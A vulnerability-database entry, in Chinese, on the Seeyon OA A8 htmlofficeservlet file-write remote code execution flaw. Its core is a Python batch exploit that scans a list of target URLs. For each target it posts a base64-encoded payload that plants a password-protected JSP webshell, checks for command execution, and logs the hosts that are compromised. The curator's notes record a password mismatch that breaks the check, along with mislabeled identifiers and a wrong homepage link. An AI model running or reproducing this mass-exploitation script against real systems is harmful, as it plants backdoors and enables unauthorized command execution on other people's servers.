---
source: "Mr-xn/Penetration_Testing_POC"
title: "致远A8 htmlofficeservlet文件写入远程代码执行批量脚本"
product: "致远A8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "B6-2019-062601"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A8V7.0SP3/V6.1SP2主张，与其他篇6.1sp1不同"
prerequisites: "无凭证脚本"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA_A8_getshell_0day.md"
id: "vw-01a1dd6355e7dce3f587c814"
entity_id: "ve-01a1dd6355e7dce3f587c814"
schema_version: "1"
---

# 致远A8 htmlofficeservlet文件写入远程代码执行批量脚本

## 条目说明

- 对象与具体问题：致远A8；htmlofficeservlet文件写入RCE批量脚本
- 版本、配置及部署条件：A8V7.0SP3/V6.1SP2主张，与其他篇6.1sp1不同
- 认证与权限前提：无凭证脚本
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- B6-2019-062601误放表格CVE编号列，是360公告编号；产品首页显示skyworth但链接seeyon，来源标签污染
- Base64载荷内密码asasd33445，回读请求asasd3344不一致，导致验证失败
- 硬编码payload副作用写Webshell；无超时/空输入阻塞/并发写结果风险
- 0day是2019历史，合并系列并核SP2范围，不新增独立漏洞

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

#### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|seeyon_rce致远 OA A8 getshell_0day|2019-06-26|360-CERT|[http://www.skyworth.com/](http://www.seeyon.com/) | [http://www.seeyon.com/](http://www.seeyon.com/) | A8 V7.0 SP3/V6.1 SP2|[B6-2019-062601](https://cert.360.cn/warning/detail?id=d877451a4dbebd852d01e9730d762076)|  

#### POC实现代码如下：  

```python
# Wednesday, 26 June 2019
# Author:nianhua
# Blog:https://github.com/nian-hua/
# python3 版本
 
import re
import requests
import base64
from multiprocessing import Pool, Manager
 
def send_payload(url):
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
    payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U="
 
    payload = base64.b64decode(payload)
 
    try:
 
        r = requests.post(url + '/seeyon/htmlofficeservlet', data=payload)
 
        r = requests.get(
            url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming')
 
        if "wangming" in r.text:
 
            return url
 
        else:
 
            return 0
 
    except:
 
        return 0
 
def remove_control_chars(s):
    control_chars = ''.join(map(chr, list(range(0,32)) + list(range(127,160))))
    
    control_char_re = re.compile('[%s]' % re.escape(control_chars))
 
    s = control_char_re.sub('', s)
 
    if 'http' not in s:
 
        s = 'http://' + s
 
    return s
 
def savePeopleInformation(url, queue):
 
    newurl = send_payload(url)
 
    if newurl != 0:
 
        fw = open('loophole.txt', 'a')
        fw.write(newurl + '\n')
        fw.close()
 
    queue.put(url)
 
def main():
 
    pool = Pool(10)
 
    queue = Manager().Queue()
 
    fr = open('url.txt', 'r')
 
    lines = fr.readlines()
 
    for i in lines:
 
        url = remove_control_chars(i)
 
        pool.apply_async(savePeopleInformation, args=(url, queue,))
 
    allnum = len(lines)
 
    num = 0
 
    while True:
 
        print(queue.get())
 
        num += 1
 
        if num >= allnum:
 
            fr.close()
 
            break
 
if "__main__" == __name__:
 
    main()
```


---

> 来源：Mr-xn/Penetration_Testing_POC
